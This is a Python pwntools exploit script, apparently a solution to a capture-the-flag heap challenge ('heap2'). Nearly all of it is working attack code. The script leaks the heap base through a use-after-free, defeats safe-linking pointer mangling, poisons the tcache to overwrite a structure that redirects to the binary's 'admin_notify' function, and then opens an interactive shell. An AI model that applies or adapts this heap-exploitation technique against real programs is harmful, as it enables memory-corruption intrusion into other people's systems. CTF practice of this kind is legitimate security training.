#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('heap2')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add_message(idx, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", data)

def delete_message(idx):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())

def edit_message(idx, data):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendline(data)

def show_message(idx):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b": ")
    data = io.recv(4).strip(b"\n")
    return u32(data.ljust(4, b"\x00"))

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 

def solve():

    add_message(0, b"GETSHELL\x00")
    delete_message(0)
    heap_base = show_message(0) << 12
    info("base: %#x", heap_base)

    ptr = mangle(heap_base, heap_base + 0x2a0)
    edit_message(0, b"A"*9)
    delete_message(0)
    edit_message(0, p64(ptr))

    add_message(1, b"GETSHELL\x00")
    add_message(2, p64(heap_base + 0x2c0) + p64(0x32) + p64(exe.sym["admin_notify"]))

    io.sendlineafter(b":", b"4")
    io.sendline(b"0")
    # add_message(1, )


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

